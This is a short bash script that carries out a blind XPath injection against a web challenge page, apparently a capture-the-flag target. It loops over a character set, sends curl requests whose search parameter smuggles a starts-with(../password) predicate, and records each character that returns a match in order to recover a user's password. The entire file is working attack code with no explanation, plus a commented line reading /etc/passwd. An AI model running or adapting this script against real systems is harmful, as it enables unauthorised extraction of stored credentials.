#!/bin/bash
#    Bob	-	abcdef	- 1
#    Harry	-			- 
#    Alex
#    Maxim
#    Lory
cat /dev/null > password.txt;
username="H";
userid="8";
password="";

for z in $(seq 1 20); do

#`$'#"=" "~" "!" "@" "%" "^" "&" "*" "(" ")" "_" "+"
    for A in   "1" "2" "3" "4" "5" "6" "7" "8" "9" "0" "-"  "q" "w" "e" "r" "t" "y" "u" "i" "o" "p" "[" "]" "\"" "Q" "W" "E" "R" "T" "Y" "U" "I" "O" "P" "{" "}" "\|" "a" "s" "d" "f" "g" "h" "j" "k" "l" ";" "A" "S" "D" "F" "G" "H" "J" "K" "L" ":" "z" "x" "c" "v" "b" "n" "m" "," "." "/" "Z" "X" "C" "V" "B" "N" "M" "<" ">" "?" ; do
	i=$A;
	pass_test=$pass$i;
echo $pass;
	curl -s "http://example.com/web-serveur/chX/?action=members&search=$username%27%29+and+starts-with%28..%2Fpassword%2C%27$pass_test" > f;
	cp f wyniki/$i;
	L=$(cat f |grep -i "1 results"|wc -l)
	#L=$(cat /etc/passwd |grep "roasdot"|wc -l)

	if [ $L == "0" ]
	then
	    echo -e " "
	else
	    echo "----------------------------------------:"$i
	    echo -n $i >>password.txt
	    pass=$pass_test;
	fi;
    done;

done;
